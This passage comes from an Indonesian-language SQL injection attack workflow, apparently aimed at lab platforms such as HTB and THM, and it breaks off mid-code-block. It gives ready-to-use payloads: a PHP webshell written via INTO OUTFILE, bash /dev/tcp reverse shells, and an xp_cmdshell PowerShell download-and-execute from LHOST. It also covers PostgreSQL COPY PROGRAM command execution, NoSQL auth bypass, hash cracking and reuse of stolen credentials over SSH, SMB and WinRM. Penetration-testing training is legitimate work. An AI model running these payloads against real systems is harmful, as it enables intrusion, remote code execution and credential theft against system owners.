**Precondition:**

```
✓ FILE privilege tersedia (lihat 12.1)
✓ secure_file_priv kosong atau izinkan destination path
✓ Web root directory writable oleh MySQL process
✓ Web server mengeksekusi PHP (atau file type yang relevan)
✓ Tahu path web root (lihat LOAD_FILE Apache config atau coba /var/www/html/)
```

**Upload webshell:**

```
'+UNION+SELECT+'<?php system($_GET["c"]); ?>',NULL+INTO+OUTFILE+'/var/www/html/sh.php'-- -
```

**Verifikasi upload:**

```bash
curl -s 'http://TARGET/sh.php'
# Jika tidak ada error = file ada

# Test execution
curl -s 'http://TARGET/sh.php?c=id'
# Expected: uid=33(www-data)
```

**Upgrade ke reverse shell:**

```bash
# Setup listener
nc -lvnp 4444

# Trigger reverse shell
curl -s "http://TARGET/sh.php" \
  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'"
```

**Jika INTO OUTFILE gagal:**

```bash
# Coba via SQLMap --os-shell (handle prerequisite check otomatis)
sqlmap -r request.txt --os-shell --batch
```

---

## 12.3 MSSQL — xp_cmdshell

**Precondition:**

```
✓ MSSQL
✓ Stacked queries support (lihat Section 11)
✓ Account DB punya sysadmin privilege atau xp_cmdshell sudah enabled
✓ Outbound network jika mau reverse shell
```

**Cek apakah xp_cmdshell sudah aktif:**

```sql
'; EXEC xp_cmdshell 'whoami'--
```

**Jika disabled, enable dulu (butuh sysadmin):**

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

**Kemudian jalankan command:**

```sql
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'hostname'--
```

**Reverse shell via PowerShell:**

```sql
'; EXEC xp_cmdshell 'powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(''http://LHOST/shell.ps1'')"'--
```

---

## 12.4 PostgreSQL — COPY PROGRAM

**Precondition:**

```
✓ PostgreSQL
✓ Superuser privilege atau pg_execute_server_program role
✓ COPY ... PROGRAM syntax tersedia (PostgreSQL 9.3+)
✓ Stacked queries support
```

```sql
'; COPY (SELECT '') TO PROGRAM 'id'--
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/LHOST/4444 0>&1"'--
```

> Pada PostgreSQL, `COPY PROGRAM` privilege sangat terbatas. `rolsuper=t` di `pg_roles` adalah indicator terkuat.

---

# 🍃 13. NoSQL Injection

## MongoDB — Auth Bypass

```bash
# Normal login (fail)
curl -s -X POST http://TARGET/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"wrong"}'
# → {"success":false}

# NoSQL injection dengan $ne (not equal)
curl -s -X POST http://TARGET/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":"invalid"}}'
# → {"success":true}
```

## Operator Injection

|Operator|Fungsi|Contoh Payload|
|---|---|---|
|`$ne`|Not equal — bypass password check|`{"password":{"$ne":null}}`|
|`$gt`|Greater than|`{"id":{"$gt":0}}`|
|`$regex`|Regex match — enumerate data|`{"username":{"$regex":"^admin"}}`|
|`$where`|JavaScript expression (legacy)|`{"$where":"this.username=='admin'"}`|

> `$where` memiliki risiko tambahan dan bukan fitur MongoDB modern yang direkomendasikan. Banyak deployment menonaktifkan ini.

## Enumerate Username via $regex

```bash
curl -s -X POST http://TARGET/login \
  -H 'Content-Type: application/json' \
  -d '{"username":{"$regex":"^admin"},"password":{"$ne":"x"}}'
```

## Identify MongoDB Endpoint

```bash
# Cari indicator di source
curl -s http://TARGET/app.js | grep -Ei "mongodb|mongoose|findOne|MongoClient"
```

---

# 📨 14. Special Contexts

## 14.1 Cookie Injection

```
[Burp] Modifikasi Cookie di Repeater:
Cookie: user=admin'
Cookie: user=admin'+AND+'1'='1-- -   (TRUE)
Cookie: user=admin'+AND+'1'='2-- -   (FALSE)
```

```bash
curl -s http://TARGET/profile -H "Cookie: user=admin' AND 1=1-- -" | wc -c
curl -s http://TARGET/profile -H "Cookie: user=admin' AND 1=2-- -" | wc -c
```

## 14.2 HTTP Header Injection

```
[Burp] Ubah header di Repeater:
User-Agent: test'+AND+1=1-- -
X-Forwarded-For: 10.0.0.1'+AND+1=1-- -
Referer: http://example.com/'+AND+1=1-- -
```

```bash
curl -s http://TARGET/ -H "User-Agent: test' AND 1=1-- -"
curl -s http://TARGET/ -H "X-Forwarded-For: 10.0.0.1' AND 1=1-- -"
```

## 14.3 JSON Body Injection

```
[Burp] POST body modification:
{"id":"10 UNION SELECT username,password FROM users-- -"}
{"search":"test'+UNION+SELECT+NULL,NULL-- -"}
```

```bash
curl -s -X POST http://TARGET/api/item \
  -H 'Content-Type: application/json' \
  -d '{"id":"10 AND 1=1-- -"}' | wc -c

curl -s -X POST http://TARGET/api/item \
  -H 'Content-Type: application/json' \
  -d '{"id":"10 AND 1=2-- -"}' | wc -c
```

## 14.4 XML Body Injection

```xml
<!-- Inject langsung -->
<id>10 UNION SELECT NULL--</id>

<!-- Dengan XML encoding (WAF bypass — lihat Section 9.1) -->
<id>10 &#x55;NION &#x53;ELECT NULL--</id>
```

```bash
curl -s -X POST http://TARGET/api \
  -H 'Content-Type: application/xml' \
  --data-binary @- <<'EOF'
<request>
  <id>10'</id>
</request>
EOF
```

---

## 14.5 ORM Injection

### 📌 Kapan Digunakan

Ketika aplikasi menggunakan ORM (SQLAlchemy, Hibernate, Sequelize, Eloquent) tetapi developer menggunakan raw query, raw expressions, atau string concatenation langsung ke query builder.

ORM aman jika pakai parameter binding. Rentan jika pakai raw query atau f-string/template.

### SQLAlchemy (Python)

```python
# ❌ VULNERABLE — String formatting langsung ke raw query
query = f"SELECT * FROM users WHERE name='{user_input}'"
db.session.execute(query)

# ✅ SAFE — Parameter binding
db.session.execute(
    "SELECT * FROM users WHERE name=:name",
    {"name": user_input}
)
# ATAU query builder:
User.query.filter_by(name=user_input).first()
```

### Sequelize (Node.js)

```javascript
// ❌ VULNERABLE — Template literal di sequelize.literal()
User.findAll({
  where: sequelize.literal(`name='${user_input}'`)
});

// ✅ SAFE — Parameter object standar
User.findAll({
  where: { name: user_input }
});
```

### Eloquent (PHP / Laravel)

```php
// ❌ VULNERABLE — whereRaw() dengan string interpolasi
User::whereRaw("email = '{$email}'")->get();

// ✅ SAFE — whereRaw() dengan parameter binding array
User::whereRaw("email = ?", [$email])->get();
```

### Cara Test ORM Injection

Metodologi identik dengan SQL Injection biasa:

1. Masukkan single quote `'` atau double quote `"` untuk memicu syntax error backend
2. Gunakan boolean difference: `' OR '1'='1` vs `' AND '1'='2`
3. Jika raw query dieksekusi di SQL backend, seluruh teknik UNION/Error/Boolean/Time berlaku seperti biasa

---

# ⚙️ 15. Automation Scripts

## 15.1 Script sqli_detect.sh

### 📌 Kapan Digunakan

Untuk screening awal parameter yang sudah dicurigai. Script ini menghasilkan baseline, quote test, boolean test, dan time test dalam satu run.

```bash
#!/usr/bin/env bash
# sqli_detect.sh — Basic SQLi detection screening
# Usage: ./sqli_detect.sh <url_tanpa_param> <param_name>
# Example: ./sqli_detect.sh 'http://TARGET/item' id
set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

usage() { echo "Usage: $0 <url> <parameter_name>"; exit 1; }

[[ $# -eq 2 ]] || usage

URL="$1"
PARAM="$2"

# Validate inputs
if [[ ! "$URL" =~ ^https?:// ]]; then
  echo -e "${RED}[!] URL must start with http:// or https://${NC}"; exit 1
fi
if [[ "$URL" =~ [[:space:]] ]]; then
  echo -e "${RED}[!] URL contains whitespace${NC}"; exit 1
fi
if [[ ! "$PARAM" =~ ^[A-Za-z0-9_-]+$ ]]; then
  echo -e "${RED}[!] Invalid parameter name (letters, numbers, _ - only)${NC}"; exit 1
fi
if ! command -v curl >/dev/null 2>&1; then
  echo -e "${RED}[!] curl is required${NC}"; exit 1
fi

TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT

echo -e "${BLUE}[*] URL       : $URL${NC}"
echo -e "${BLUE}[*] Parameter : $PARAM${NC}"
echo

# 1. Baseline
echo -e "${YELLOW}[1] Baseline${NC}"
BASE_TIME=$(curl -ksS -o "$TMP/base" -w '%{time_total}' \
  --get --data-urlencode "${PARAM}=10" "$URL")
BASE_SIZE=$(wc -c < "$TMP/base")
echo "    Time: ${BASE_TIME}s | Size: ${BASE_SIZE} bytes"

# 2. Single quote
echo -e "\n${YELLOW}[2] Single Quote Test${NC}"
QUOTE_TIME=$(curl -ksS -o "$TMP/quote" -w '%{time_total}' \
  --get --data-urlencode "${PARAM}=10'" "$URL")
QUOTE_SIZE=$(wc -c < "$TMP/quote")
echo "    Time: ${QUOTE_TIME}s | Size: ${QUOTE_SIZE} bytes"
if grep -Eqi \
  'sql syntax|mysql|mariadb|postgresql|pgsql|sql server|oracle|sqlite|syntax error|pdoexception|unclosed quotation' \
  "$TMP/quote"; then
  echo -e "    ${RED}[!] SQL error indicator detected!${NC}"
else
  echo "    [-] No obvious SQL error in response"
fi

# 3. Boolean TRUE
echo -e "\n${YELLOW}[3] Boolean TRUE (AND 1=1)${NC}"
TRUE_TIME=$(curl -ksS -o "$TMP/true" -w '%{time_total}' \
  --get --data-urlencode "${PARAM}=10 AND 1=1-- -" "$URL")
TRUE_SIZE=$(wc -c < "$TMP/true")
echo "    Time: ${TRUE_TIME}s | Size: ${TRUE_SIZE} bytes"

# 4. Boolean FALSE
echo -e "\n${YELLOW}[4] Boolean FALSE (AND 1=2)${NC}"
FALSE_TIME=$(curl -ksS -o "$TMP/false" -w '%{time_total}' \
  --get --data-urlencode "${PARAM}=10 AND 1=2-- -" "$URL")
FALSE_SIZE=$(wc -c < "$TMP/false")
echo "    Time: ${FALSE_TIME}s | Size: ${FALSE_SIZE} bytes"

if [[ "$TRUE_SIZE" != "$FALSE_SIZE" ]]; then
  echo -e "    ${GREEN}[!] Boolean difference! TRUE=${TRUE_SIZE} FALSE=${FALSE_SIZE}${NC}"
else
  echo "    [-] No boolean size difference"
fi

# 5. Time-based (MySQL SLEEP syntax)
echo -e "\n${YELLOW}[5] Time-Based (MySQL SLEEP(5))${NC}"
TIME_VAL=$(curl -ksS -o /dev/null -w '%{time_total}' \
  --get --data-urlencode "${PARAM}=10 AND SLEEP(5)-- -" "$URL")
echo "    Time: ${TIME_VAL}s"
awk -v t="$TIME_VAL" 'BEGIN { exit !(t >= 4.0) }' && \
  echo -e "    ${GREEN}[!] Possible time-based SQLi! (MySQL SLEEP)${NC}" || \
  echo "    [-] No significant delay"

# Summary
echo
echo -e "${YELLOW}=== Summary ===${NC}"
echo "Baseline : ${BASE_TIME}s / ${BASE_SIZE} bytes"
echo "Quote    : ${QUOTE_TIME}s / ${QUOTE_SIZE} bytes"
echo "TRUE     : ${TRUE_TIME}s / ${TRUE_SIZE} bytes"
echo "FALSE    : ${FALSE_TIME}s / ${FALSE_SIZE} bytes"
echo "SLEEP    : ${TIME_VAL}s"

echo
echo -e "${YELLOW}Next steps:${NC}"
echo "1. If SQL error → Section 4 (Error-Based)"
echo "2. If TRUE≠FALSE → Section 5 (Boolean Blind)"
echo "3. If SLEEP delay → Section 6 (Time-Based), also test pg_sleep/WAITFOR"
echo "4. Confirm DB type (Section 1.4)"
echo "5. Identify injection context (Section 1.5)"
echo "6. Validate manually with Burp before SQLMap"
```

```bash
chmod +x sqli_detect.sh
./sqli_detect.sh 'http://TARGET/item' id
./sqli_detect.sh 'http://TARGET/filter' category
```

> **Note:** Script menggunakan `AND SLEEP(5)` untuk time-based — secara native paling cocok untuk MySQL/MariaDB. Untuk DB lain, test manual dengan syntax yang sesuai (Section 6.3).

---

## 15.2 Boolean Blind Python Extractor

Lihat Section 5.4 untuk script lengkap dengan argparse, URL validation, dan parameter validation.

---

## 15.3 One-Liners

```bash
# Boolean diff check cepat
curl -s -o t.html 'http://TARGET/item?id=10%20AND%201=1-- -'
curl -s -o f.html 'http://TARGET/item?id=10%20AND%201=2-- -'
wc -c t.html f.html

# Quick error check
curl -si 'http://TARGET/item?id=10%27' | grep -iE "(sql|error|syntax|mysql|oracle)"

# Quick UNION column test (3 columns)
curl -s 'http://TARGET/item?id=10%27+UNION+SELECT+NULL,NULL,NULL-- -' | wc -c

# Quick MySQL time test
time curl -s -o /dev/null --get \
  --data-urlencode "id=10 AND SLEEP(5)-- -" 'http://TARGET/item'

# Quick PgSQL time test
time curl -s -o /dev/null --get \
  --data-urlencode "id=10 AND 1=(SELECT 1 FROM pg_sleep(5))-- -" 'http://TARGET/item'

# Quick wafw00f scan
wafw00f http://TARGET
```

# 🌳 16. Decision Trees

> Decision trees di sini bersifat **operational**: setiap branch menjawab pertanyaan konkret dan mengarah ke langkah nyata.

## 16.1 Core Detection Decision Tree

```
INPUT PARAMETER DITEMUKAN (GET/POST/Cookie/Header/XML)
          │
          ▼
    [FASE 0] Ambil baseline → petakan tech stack
          │
          ▼
    [FASE 1] Inject single quote '
          │
          ├── SQL Error visible
          │      │
          │      ▼
          │   Error-Based SQLi CANDIDATE
          │      │
          │      ▼
          │   Validate: coba UNION (Section 3)
          │   atau CAST/CONVERT extraction (Section 4)
          │
          ├── Response berbeda (size/content)
          │      │
          │      ▼
          │   Boolean Blind CANDIDATE
          │      │
          │      ▼
          │   Validate: TRUE vs FALSE test (Section 5)
          │
          ├── Delay ~5-10 detik
          │      │
          │      ▼
          │   Time-Based CANDIDATE
          │      │
          │      ▼
          │   Validate: ulangi delay test, cek baseline (Section 6)
          │
          └── Tidak ada perbedaan
                 │
                 ▼
              Jangan simpulkan "tidak ada SQLi"
                 │
              ├── Test context berbeda (numeric vs string)
              ├── Test parameter lain
              ├── Test Cookie / Header
              ├── Test Login context (Section 2)
              └── Test OOB jika ada Burp Collaborator (Section 7)
```

**Perbedaan CANDIDATE vs VALIDATED FINDING:**

|State|Arti|
|---|---|
|CANDIDATE|Observasi menunjukkan kemungkinan SQLi|
|INDICATION|Beberapa test konsisten menunjukkan SQLi|
|CONFIRMED|Bisa extract data atau trigger controlled error|
|IMPACT|Terbukti bisa akses data sensitif|

---

## 16.2 UNION Execution Path

```
Confirmed SQLi + In-Band response
     │
     ▼
ORDER BY / NULL method → Column count
     │
     ▼
UNION SELECT 'A','B','C'... → Displayable columns
     │
     ▼
version(), database(), user() → DB fingerprint
     │
     ▼
information_schema / all_tables → Table names
     │
     ▼
information_schema.columns / all_tab_columns → Column names
     │
     ▼
Dump: username||'~'||password FROM users
     │
     ▼
Validate: data tersebut valid? (cek format, tipe)
```

---

## 16.3 DB-Specific Capabilities

```
DB Identified
     │
     ├── MySQL
     │   ├── @@version, database(), user()
     │   ├── information_schema
     │   ├── SLEEP() time-based
     │   ├── INTO OUTFILE (jika FILE priv + writable path)
     │   └── GROUP_CONCAT untuk bulk enum
     │
     ├── PostgreSQL
     │   ├── version(), current_database(), current_user
     │   ├── information_schema + pg_catalog
     │   ├── pg_sleep() time-based (gunakan subquery wrapper)
     │   ├── COPY ... PROGRAM (jika superuser)
     │   └── CAST error-based
     │
     ├── MSSQL
     │   ├── @@VERSION, DB_NAME(), SYSTEM_USER
     │   ├── sys.tables, sys.columns
     │   ├── WAITFOR DELAY time-based (stacked)
     │   ├── xp_cmdshell (jika sysadmin)
     │   └── CONVERT error-based
     │
     ├── Oracle
     │   ├── v$version, all_tables, all_tab_columns
     │   ├── USER, SYS_CONTEXT FROM dual
     │   ├── DBMS_PIPE.RECEIVE_MESSAGE time-based
     │   ├── EXTRACTVALUE DNS OOB
     │   └── Wajib FROM DUAL untuk SELECT tanpa tabel
     │
     └── SQLite
         ├── sqlite_version()
         ├── sqlite_master (TIDAK ADA information_schema)
         ├── group_concat() untuk bulk
         └── TIDAK ADA native SLEEP() — time-based tidak applicable
```

---

## 16.4 Technique Selection

```
Confirmed SQLi → Pilih teknik berdasarkan kondisi:

Response menampilkan data → UNION (Section 3)
   │
   ▼
Tidak menampilkan data tapi ada SQL error → Error-Based (Section 4)
   │
   ▼
Tidak ada error tapi response berbeda TRUE/FALSE → Boolean Blind (Section 5)
   │
   ▼
Tidak ada perbedaan tapi bisa trigger delay → Time-Based (Section 6)
   │
   ▼
Tidak ada output, delay tidak reliable, DB bisa callback → OOB (Section 7)
```

---

# 🛠️ 17. Troubleshooting

|Symptom|Likely Cause|Validation|Next Action|
|---|---|---|---|
|Single quote tidak trigger error|Error tersembunyi oleh aplikasi / tidak ada SQLi|Lakukan Boolean test: TRUE vs FALSE size comparison|Test `'+AND+'1'='1` vs `'+AND+'1'='2`|
|UNION error "column mismatch"|Jumlah NULL salah|Ulangi ORDER BY dari 1, atau NULL method step by step|Tambah NULL satu per satu sampai tidak error|
|UNION berhasil tapi data tidak muncul|Row asli override inject result|Gunakan `id=0` atau `id=99999` (ID tidak exist)|Ganti value parameter ke ID non-existent|
|GROUP_CONCAT terpotong|`group_concat_max_len` default 1024 bytes|Cek panjang output, lihat apakah ada `...` terpotong|Gunakan `LIMIT 1 OFFSET n` per baris, atau `SET group_concat_max_len=65536`|
|`--` tidak bekerja di MySQL|Missing trailing space / dialect mismatch|Test `-- -` vs `#` vs `%23`|Gunakan `-- -` (dash dash space dash) atau `#`|
|Response sama untuk TRUE/FALSE|Context salah (string vs numeric)|Test `'+AND+'1'='1` (string) vs `+AND+1=1` (numeric)|Coba context yang belum dicoba|
|SLEEP tidak delay|Wrong DB syntax / DB bukan MySQL|Test semua: `pg_sleep()`, `WAITFOR DELAY`, `DBMS_PIPE`|Identifikasi DB type dari Section 1.4 dulu|
|`pg_sleep()` syntax error|`void` type mismatch di concatenation|Coba form `AND 1=(SELECT 1 FROM pg_sleep(5))`|Gunakan subquery wrapper atau stacked query|
|INTO OUTFILE gagal|`secure_file_priv` restriction / no FILE privilege|Cek `@@secure_file_priv` dan privilege|Coba SQLMap `--os-shell`, atau cari path yang diizinkan|
|403 di semua payload|WAF aktif|`wafw00f`, lihat response header|Coba encoding, case variation, tamper scripts satu per satu|
|SQLMap tidak detect meski manual berhasil|Butuh cookie/header / WAF blocking SQLMap|Gunakan `-r request.txt` dari Burp (paling reliable)|Tambahkan `--random-agent`, `--delay=1`, atau `--proxy=Burp`|
|Payload terpotong|Input length limit / sanitasi aplikasi|Coba value pendek dulu, amati dimana terpotong|Encode payload, hex values, atau bagi injection|
|Boolean blind selalu FALSE|`true_marker` salah / wrong context|Verifikasi marker dari TRUE response baseline|Update `--marker` ke string yang selalu ada di TRUE response|
|Time delay tidak konsisten|Network latency / server load|Ulangi 3x, ambil rata-rata|Naikkan threshold ke 8-10s, test di waktu berbeda|
|Oracle `FROM dual` error|Versi Oracle / privilege|Coba `SELECT 1 FROM dual` saja dulu|Periksa privilege dan version Oracle|
|Oracle `all_tab_columns` tidak return|Nama tabel case mismatch|Oracle biasanya uppercase|Gunakan `UPPER('tablename')` atau cek `all_tables` dulu|
|XML encoding tidak bekerja|Server tidak parse XML entities / WAF normalize|Coba decimal `&#85;` vs hex `&#x55;`|Test entity lain, atau coba character reference format berbeda|
|OOB tidak ada callback|No egress / privilege kurang / firewall|Cek dengan `ping` DNS test dulu|Konfirmasi DB privilege untuk HTTP/DNS; test internal vs external callback|
|OR 1=1 return error|Multiple rows dari query → aplikasi expect satu row|Error: "Subquery returns more than 1 row"|Tambahkan `LIMIT 1` atau target username spesifik|
|Cookie injection tidak bekerja|Cookie tidak dipakai dalam SQL query|Trace request di Burp, lihat apakah cookie digunakan server-side|Cari parameter / header lain yang lebih likely digunakan dalam query|
|JSON injection tidak bekerja|Backend menggunakan prepared statement / ORM parameter binding|Inspect response, tidak ada SQL error|Test endpoint lain; aplikasi mungkin tidak concatenate JSON value ke SQL|
|Double encoding tidak berhasil|App hanya decode sekali|Response tidak berubah|Jangan gunakan double encoding tanpa bukti multi-decode|
|NoSQL `$ne` ditolak|Backend melakukan schema validation / tipe validation|400 Bad Request dengan schema error|Inspect expected JSON type dan endpoint logic|
|`xp_cmdshell` disabled|Feature dinonaktifkan di SQL Server|Error: xp_cmdshell tidak ditemukan|Coba enable jika punya sysadmin (Section 12.3), atau cari pivot lain|
|`COPY ... PROGRAM` gagal|Tidak superuser di PostgreSQL|Error: permission denied|Cek `rolsuper` dari `pg_roles`, tidak bisa override tanpa privilege|

---

# 🧠 18. Muscle Memory Quick Flow

Saat menemukan parameter, biasakan urutan ini:

```
1. Identify parameter
   → GET/POST/Cookie/Header/JSON/XML?
   ↓
2. Ambil baseline response
   → Size, status, unique markers
   ↓
3. Single quote test
   → Error? Size change? Delay?
   ↓
4. Identify DB clues
   → Error message, headers, tech stack
   ↓
5. Identify injection context
   → String? Numeric? Subquery?
   ↓
6. TRUE / FALSE test
   → Pilih payload sesuai context
   ↓
7. Determine technique
   → UNION / Error-Based / Boolean Blind / Time-Based
   ↓
8. Enumerate
   → Column count → Displayable cols → DB → Tables → Columns
   ↓
9. Extract only needed data
   → Username + password / token / key
   ↓
10. Check privilege (jika mau escalate)
    → FILE priv / superuser / xp_cmdshell?
    ↓
11. Assess post-exploitation path
    → Credential reuse / RCE / pivot
```

---

# ✅ 19. Final Operational Checklist

```
DETECTION
[ ] Parameter identified (GET/POST/Cookie/Header/JSON/XML)
[ ] Baseline response recorded (size, status, markers)
[ ] Single quote tested
[ ] Error behavior analyzed
[ ] Boolean TRUE/FALSE tested
[ ] Time delay tested (per DB jika perlu)

IDENTIFICATION
[ ] DBMS identified
[ ] Injection context identified (string/numeric/subquery)
[ ] Comment syntax confirmed

UNION (jika in-band)
[ ] UNION candidate confirmed
[ ] Column count determined (ORDER BY / NULL method)
[ ] Displayable columns found
[ ] Database name extracted
[ ] Table names extracted
[ ] Column names extracted
[ ] Required data extracted

BLIND (jika diperlukan)
[ ] Boolean Blind TRUE/FALSE marker confirmed
[ ] OR Time-Based delay confirmed per DB syntax
[ ] Extraction automated (Python / SQLMap)

ESCALATION (jika relevan)
[ ] DB privilege checked before RCE/file primitives
[ ] secure_file_priv checked (MySQL)
[ ] LOAD_FILE read test passed (MySQL RCE path)
[ ] xp_cmdshell availability checked (MSSQL)
[ ] rolsuper checked (PostgreSQL COPY PROGRAM)

AUTOMATION
[ ] SQLMap validated manually first
[ ] WAF identified if present
[ ] Tamper used only when justified by specific WAF behavior

DOCUMENTATION
[ ] Injection point documented
[ ] Technique documented
[ ] Evidence captured
[ ] Impact assessed
[ ] Cross-service pivot opportunities noted
```

---

# ⬇️ 20. Post-SQLi: Cross-Service Pivot

## Credential State Machine

Jangan anggap credential yang ditemukan langsung valid. Ikuti state ini:

```
Credential Found (username + hash/plaintext di DB)
       │
       ▼
Credential Candidate
   │
   ├── Hash? → Perlu cracking dulu
   └── Plaintext? → Langsung bisa dicoba
       │
       ▼
Validation (test ke service)
       │
   ├── Berhasil login → Validated Credential
   └── Gagal → Candidate tidak valid di service ini
             → Coba service lain / coba crack hash
       │
       ▼
Validated Credential
       │
       ▼
Cross-Service Testing
```

---

## Skenario 1: Password Plaintext

```bash
# Web admin login
curl -s -X POST http://TARGET/login \
  -d "username=administrator&password=s3cr3t" -L | \
  grep -i "welcome\|dashboard\|logout"

# SSH
ssh administrator@TARGET
# atau:
nxc ssh TARGET -u administrator -p 's3cr3t'

# SMB
nxc smb TARGET -u administrator -p 's3cr3t'

# FTP
nxc ftp TARGET -u administrator -p 's3cr3t'

# Database direct access
mysql -h TARGET -u administrator -p's3cr3t'
psql -h TARGET -U administrator -d dbname

# WinRM (Windows)
nxc winrm TARGET -u administrator -p 's3cr3t'
evil-winrm -i TARGET -u administrator -p 's3cr3t'
```

---

## Skenario 2: Password Hash

```bash
# Identifikasi tipe hash
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# Output: [+] MD5

# Crack dengan hashcat
hashcat -m 0    hashes.txt /usr/share/wordlists/rockyou.txt   # MD5
hashcat -m 100  hashes.txt /usr/share/wordlists/rockyou.txt   # SHA1
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt   # SHA-256
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt   # SHA-512 crypt (Linux shadow)
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt   # bcrypt

# Dengan rules (jika wordlist tidak cukup)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## Skenario 3: Artefak Lain

```bash
# API Key / JWT Secret → test ke API endpoint
curl -s http://TARGET/api/admin \
  -H "Authorization: Bearer FOUND_TOKEN"

# Private Key (id_rsa)
chmod 600 found_id_rsa
ssh -i found_id_rsa username@TARGET

# Email address → password reset poisoning
# → lihat <a href="/docs/authentication-bypass" class="text-[#00b4d8] hover:underline font-mono font-semibold">18_authentication_bypass_workflow.md</a>
```

---

## Cross-Service Diagram

```
SQLi Credential Found
       │
       ├──→ Web Admin Panel → Upload webshell / template injection / file manager
       │
       ├─ ─→ Port 22 (SSH) → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
       │
       ├─ ─→ Port 21 (FTP) → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
       │
       ├─ ─→ Port 445 (SMB) → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
       │
       ├──→ Port 3306/5432/1433 (DB) → direct DB access
       │
       ├──→ Port 5985 (WinRM) → evil-winrm
       │
       └─ ─→ Hash cracking → <a href="/docs/password-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">63_password_cracking_workflow.md</a>
                   │
                   ▼
            Cracked credentials → kembali ke diagram ini
```

---

# 🎮 21. Interactive Decision Guide

> **Cara baca:** Ikuti langkah sesuai output yang kamu dapat. Setiap step ada OUTPUT ✅ dan OUTPUT ❌. Jangan skip fase.

---

## PRE-FLIGHT: Setup Environment

```bash
# Jalankan ini di awal sesi HTB/THM/Proving Grounds
export TARGET="10.10.11.200"     # IP target
export LHOST="10.10.14.5"        # IP tun0 kamu (VPN)
export LPORT="4444"

export TARGET_URL="http://$TARGET"
mkdir -p ~/sqli_loot/{dumps,hashes,shells,requests}
cd ~/sqli_loot
echo "[*] Target: $TARGET | URL: $TARGET_URL"
```

---

## ═══════════════════════════════════

## FASE 0: RECONNAISSANCE

## ═══════════════════════════════════

### Langkah 0.1 — Identifikasi Entry Points

```
[Burp] HTTP History → browse semua halaman → kumpulkan endpoint
Perhatikan: GET params, POST body, cookies, headers
```

```bash
# Lihat header tech stack
curl -sI "$TARGET_URL" | head -20

# Cari parameter di URL dan form
curl -s "$TARGET_URL" | grep -oP '(href|action|src)="[^"]*\?[^"]*"' | sort -u
curl -s "$TARGET_URL" | grep -oP '\?[a-zA-Z_]+=\S+'
```

**OUTPUT ✅ — Parameter ditemukan:**

```
?id=10
?category=Gifts
?user=admin
```

→ Catat semua parameter. Set environment variable:

```bash
export PARAM="id"
export PARAM_VALUE="10"
export INJECT_URL="$TARGET_URL/item?$PARAM=$PARAM_VALUE"
```

### Langkah 0.2 — Ambil Baseline Response

```
[Burp] Pilih request → Send to Repeater (Ctrl+R) → Send → catat response size
```

```bash
curl -s -o /dev/null -w "HTTP: %{http_code} | Size: %{size_download}\n" \
  "$INJECT_URL"
```

**OUTPUT ✅:**

```
HTTP: 200 | Size: 14820
```

```bash
export BASELINE_SIZE=14820
export TRUE_MARKER="Product"   # Teks yang SELALU ada di response normal
```

---

## ═══════════════════════════════════

## FASE 1: DETECTION

## ═══════════════════════════════════

### Langkah 1.1 — Single Quote Test

```
[Burp] Repeater: ubah parameter → id=10' → Send → perhatikan response
```

```bash
curl -s -o ~/sqli_loot/quote_test.html \
  -w "HTTP: %{http_code} | Size: %{size_download}\n" \
  --get --data-urlencode "$PARAM=10'" \
  "$TARGET_URL/item"

grep -iE "(sql syntax|mysql|mariadb|postgresql|sql server|oracle|sqlite|syntax error|pdoexception|unclosed quotation)" \
  ~/sqli_loot/quote_test.html
```

**OUTPUT ✅ — SQL Error MySQL:**

```
You have an error in your SQL syntax...
```

→ SQLi confirmed! DB = MySQL/MariaDB

```bash
export DB_TYPE="MySQL"
```

→ Lanjut ke **FASE 2 (UNION)** atau **FASE 3 (Error-Based)**

**OUTPUT ❌ — Generic error / tidak ada SQL error:** → Lanjut ke Boolean test:

```bash
curl -s -o ~/sqli_loot/true_test.html --get \
  --data-urlencode "$PARAM=10 AND 1=1-- -" "$TARGET_URL/item"
curl -s -o ~/sqli_loot/false_test.html --get \
  --data-urlencode "$PARAM=10 AND 1=2-- -" "$TARGET_URL/item"
wc -c ~/sqli_loot/baseline.html ~/sqli_loot/true_test.html ~/sqli_loot/false_test.html
```

**OUTPUT ✅ — Size berbeda:**

```
14820  baseline.html
14820  true_test.html
421    false_test.html   ← FALSE berbeda!
```

→ Boolean Blind SQLi! → **FASE 4 (Boolean Blind)**

**OUTPUT ❌ — Tidak ada perbedaan:** → Time-based test:

```bash
time curl -s -o /dev/null --get \
  --data-urlencode "$PARAM=10 AND SLEEP(5)-- -" "$TARGET_URL/item"
```

**OUTPUT ✅ — Delay ~5 detik:** → Time-Based SQLi! → **FASE 5 (Time-Based)**

**OUTPUT ❌ — Semua negatif:** → Coba context berbeda, parameter lain, Cookie, Header. Jika form login tersedia → **FASE 3 (Login Bypass)**

### Langkah 1.2 — Identifikasi Context

```bash
# String context
curl -s --get --data-urlencode "$PARAM=10' AND '1'='1-- -" "$TARGET_URL/item" | wc -c
curl -s --get --data-urlencode "$PARAM=10' AND '1'='2-- -" "$TARGET_URL/item" | wc -c

# Numeric context
curl -s --get --data-urlencode "$PARAM=10 AND 1=1-- -" "$TARGET_URL/item" | wc -c
